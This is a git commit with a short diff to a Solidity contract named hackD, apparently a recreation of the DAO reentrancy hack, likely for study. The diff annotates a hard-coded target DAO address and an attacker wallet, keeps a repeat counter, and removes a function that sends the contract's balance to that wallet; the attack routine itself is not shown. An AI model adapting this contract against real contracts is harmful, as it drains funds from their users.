b8ff2ccd415776230e77555b77bb15e5d091b760
MA354105 <mandeep.singh21@wipro.com>
2018-07-29 14:29:02 +0530

    more simplification to DAO Hack

--- hackD.sol
+++ hackD.sol
@@ -6,9 +6,9 @@ contract TheDAO{
 contract hackD {
   //uint public value;
   uint public times = 3;
-  address dao6 = 0x9dF811B42206FB6BE7d2AbAae43C332a1299C7C8;
+  address dao6 = 0x9dF811B42206FB6BE7d2AbAae43C332a1299C7C8; // Address of target DAO
   mapping (address => uint) balances;
- address myWallet = 0x4E828d2cE71cc1fc9233902945D9f452c61Cc465;
+ address myWallet = 0x4E828d2cE71cc1fc9233902945D9f452c61Cc465; // Your address
 
 function hackD() payable public  {
 
@@ -22,11 +22,6 @@ function hackD() payable public  {
 
   function balanceOf(address _addr) public view returns (uint) {
     return balances[_addr];
-  }
-
-   function withdrawAll() public payable{
-  //  owner.send(this.balance);
-    myWallet.send(this.balance);
   }
 
    function sendMoney() public payable  {
